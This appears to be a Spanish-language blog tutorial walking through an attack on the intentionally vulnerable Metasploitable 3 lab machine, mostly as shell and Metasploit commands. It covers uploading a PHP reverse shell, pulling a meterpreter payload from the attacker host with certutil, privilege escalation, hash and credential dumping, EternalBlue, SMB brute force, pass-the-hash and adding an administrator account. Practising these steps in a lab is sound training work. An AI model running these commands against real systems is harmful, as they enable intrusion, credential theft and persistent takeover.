---
title: "Análsis de Vulnerabilidades y Explotación"
date: 2026-03-28 17:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [cracking, enumeración, Nmap, Metasploit, Hydra y CrackMapExec]
description: Cómo enumerar usuarios y crackear contraseñas de servicios vulnerables.
---

En este artículo, analizaremos las distintas formas de analizar las vulnerabilidades en los sistemas, para este caso utilizaremos una máquia llamada Metaspoitable 3, la cual incluye bastantes servicios instalados que son vulnerables y nos permitirá practicar los conocimientos adquiridos.

## Escaneo de Puertos y Enumeración | Windows
Como ya es de conocimiento, debemos empezar analizando los puertos abiertos que tiene el host destino.
```shell
ping dominio.local
nmap -p- -T5 dominio.local
```
1) Iniciaremos por los puertos http con un escaneo completo y anaizar las vulnerabilidades en search exploit.
```shell
nmap -p--T5 -sV -sC -n dominio.local --stats-every 3
```
Durante este análisis recomendamos analizar la página web con los puertos que tenga http, esto lo realizaremos con ayuda del navegador.

En sitios vulnerables de wordpress, se puede analizar el código fuente ya que este servicio puede estar en otro lugar y hay que agregar la ip y el dominio en /etc/hosts.

Para saber la información como los nombres de los hosts, se empieza con un crackmapexec.
```shell
crackmapexec smb dominio.local
```

En nuestro navegador accederemos al dominio en conjunto con su puerto.
http://dominio.local:8585/uploads

Con enemap podemos hacer un escaneo de http-enum, cuyo formato es el siguiente:
```shell
nmap -p 8585 --script http-enum -sV dominio.local
```
Este comando permite saber que folders permiten recabar información.

Al encontrar una carpeta uploads, podemos probar haciendo un PUT para subir archivos, si lo permite la vulnerabilidad. Para ello ultilizaremos la herramienta davtest.

```shell
davtest -sendbd -auto -url http://dominio.local:8585/uploads
```
Como resultado del comando anterior, la herramienta intenta crear una carpeta y subir una gran cantidad de extensiones para saber cuales están permitidas y cuales no. También permite saber qué archivos permite ejecutar una vez que se los ha cargado en el server. La ventaja de este comando es saber que exploit podemos subir a un server para escalar privilegios.

Para subir un archivo personalizado con un script, se ejecuta la herramienta cadaver.

En linux podemos buscar reverse shell que ya están listas para su uso.
```shell
locate php-rev
more /usr/share/laudanum/php/php-reverse-shell.php

http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php
```

```shell
ping dominio.local -I eth0
arp-scan -I eth1 --localnet
#para saber que interfaz tiene conexión con el dominio.

cadaver http://dominio.local:8585/uploads
dav:/uploads/> help
dav:/uploads/> put php-rev-shell.php
dav:/uploads/>  
```

Al descubrir la vulnerabilidad de que se pueden subir archivos al servicor, se procede a guardar el scipt del php-rev-shell.php; el cuál permitirá hacer una conexión con la shell del servidor.

```shell
nc -nlvp 8765
listing on [any] 8765 ...
c://wamp/bin/apache/Apache2.2>
```
Desde davtest se procede a abrir el archivo con la shell reversa para tener acceso a la terminal.

Ahora detallaremos los comándos útiles que podemos emplear en una cmd de Windows
* systeminfo > Devuelve información revelante del equipo.
* Whoami > Permite saber cómo está ejecutanto la información el usuario, si tenemos acceso al root sería lo ideal.
* net user usuariodeprueba password /add > Si tenemos los permisos, podremos crear un usuario de prueba.
* whoami /priv > Se puede ver los privilegios que posee dicho usuario.
    SeImpersonatePrivilege > Un privilegio que es importante tener, el cual permite personificar un servicio u otro usuario. Si se tiene habilitado, se puede escalar privilegios a través de distintos binarios. El más útil se llama JuicyPotato.exe o GodPotato.exe o con un módulo de Metasploit.

    Para pasar una shell de cmd de windows a Metasploit, se debe realizar lo siguiente:
    * En linux se debe generar el payload mediante MSFVENOM o https://revshells.com
    * **[Revshells](https://revshells.com)**: Permite construir la línea de msfvenom para crear una revershell y poder escalar privilegios.
    ```shell
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.0.0.1 LPORT=1234 -f exe -o reverse.exe
    python3 -m http.server 80
    ```
> Advertencia: La IP que va en LHOSTS debe ser de la máquina que está atacando.
{: .prompt-warning }

Ahora en la máquina que ya logré acceder al cmd debo utilizar certutil.exe
```shell
c:\\Windows\Temp\ > certutil.exe -f -split -urlcache http://10.0.0.1/reverse.exe reverse.exe
```
Con la shell de arriba se logra traer el programa reverse.exe a la máquina Windows y se queda a la espera hasta que msfconsole esté a la escucha y para ejecutarlo se realiza con el nombre reverse.exe.

Postrior a eso se debe ejecutar msfconsole
```shell
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 5321
run

meterpreter> getprivs #privilegios que tiene el usuario
meterpreter> getuid #Permite ver que usuario soy
meterpreter> getsystem #Permite escalar privilegios

Ctrl+Z # Permite hacer un backgroud de la sessión
sessions -i 1 # Permite regresar a la sesión

Ctrl+Z
use post/multi/recon/local_exploit_suggester
set session 1
run #Con esto se puede saber todos los módulos que permiten explotar la máquina

use exploit/windows/local/ms16_075/reflection/juicy
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 4923
set session 1
exploit #abre una segunda sessión

meterpreter > hashdump #Saca hashes de todos los usuarios
```

Para descifrar todos los hashes, se copia todo a un fichero en linux llamado hashes.txt y se procede a descifrar con crackstation.

> Advertencia: Crackstation solo descifra la segunda parte del hash.
{: .prompt-warning }

```shell
cat hashes.txt | cut -d ":" -f 4 #-f es el número de cámpo
```
 **[Crackstation](https://crackstation.com)**: Descifra los hashes que sean cómunes y no complejos.

Otra forma para descifrar los hashes es con John the ripper

```shell
john hashes.txt --format=NT
```

```shell
meterpreter > load kiwi #permite sacar información de credenciales en equipos antiguos que tengan en texto en plano
meterpreter > help
meterpreter > creds_all 
meterpreter > lsa_dump_sam #formato para hacer pass the hash

meterpreter > load incognito #Permite acceder si el usuario no tiene el permiso de SeImpersonatePrivilege
meterpreter > list_tokens -u
```

Con eso se finaliza la escalación de privilegios.

##Analizando vulnerabilidades SMB
```shell
ls usr/share/nmap/scripts/ | grep smb #permite ver todos los scripts que tienen smb*
nmap -p 445,139 --script smb-vuln* dominio.local

msfconsole -q
> search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS dominio.local
set LPORT 1234
run

meterpreter > getuid
meterpreter > hashdump
```
Ahora es importante sacar solo los usuarios
```shell
cat hashes.txt | cut -d ":" -f 1 >> users.txt
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=users.txt dominio.local

gzip -d /usr/share/wordlists/rockyou.txt.gz
crackmapexec smb dominio.local -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success
```

### Vulnerabilidad RDP 
> Advertencia: Para esta vulnerabilidad solo se recomineda realizar el escaneo SCAN, no porbar la acción CRASH ya que puede crashear el equipo.
{: .prompt-warning }

```shell
msfconsole -q
search bluekeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set rhosts dominio.local
run
```

### Vulnerabilidad Pass the hash

```shell
msfconsole -q
search exploit/windows/smb/psexec #Herramienta para hacer una conexión similar a ssh
set rhosts dominio.local
set lport 1253
set SMBUSER Administrator
set SMBPASS hashlargo3:haslargo4
exploit
```

Ahora se procede a ejecutar la misma vulnerabilidad con el hash pero con la herramienta crackmapexec
```shell
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "whoami"
(Pwn3d!) #Significa que si puedo conectarme con ese hash.
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "net user prueba password /add"
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "net localgroup administrators prueba /add"
crackmapexec smb dominio.local -u usuario -p password

rdesktop dominio.local #para conectarse con el nuevo usuario creado
```